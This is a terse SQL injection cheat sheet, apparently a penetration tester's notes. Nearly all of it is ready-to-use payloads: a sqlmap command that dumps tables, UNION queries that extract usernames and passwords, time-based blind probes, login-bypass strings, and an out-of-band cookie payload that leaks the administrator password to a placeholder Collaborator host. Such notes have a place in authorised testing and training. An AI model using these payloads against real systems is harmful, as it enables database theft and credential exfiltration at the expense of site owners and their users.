# SQL Injection

-- o #

## Reflected SQL Injection:</h2>
```bash
sqlmap --url https://$domain/filter?category=Lifestyle --dump --schema --tables --columns
Results:
Database: public
Table: users
[POC]:
https://$domain/filter?category=Lifestyle'+UNION+SELECT+username,+password+FROM+users--

# Version
## First detect numbers of columns
```html
' UNION SELECT NULL,@@version--
' UNION SELECT NULL,NULL,* FROM v$version--
' UNION SELECT banner FROM v$version--
' UNION SELECT version FROM v$instance--
' UNION SELECT version()--
```

## Blind SQL Injection:
```html
';SELECT PG_SLEEP(5)--
'||pg_sleep(10)--
'SLEEP(2);--
```
## SQL Login
In nickname, email and password test for
```html
name'--
pass'--
'+OR+1=1--
'+OR+2=2--
'+OR+5=5--
'+OR+'E'='E'--
```


## Test cookies for https request - Blind:
```html
  TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
```

### Then for credentials.
```html
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--.
  ```
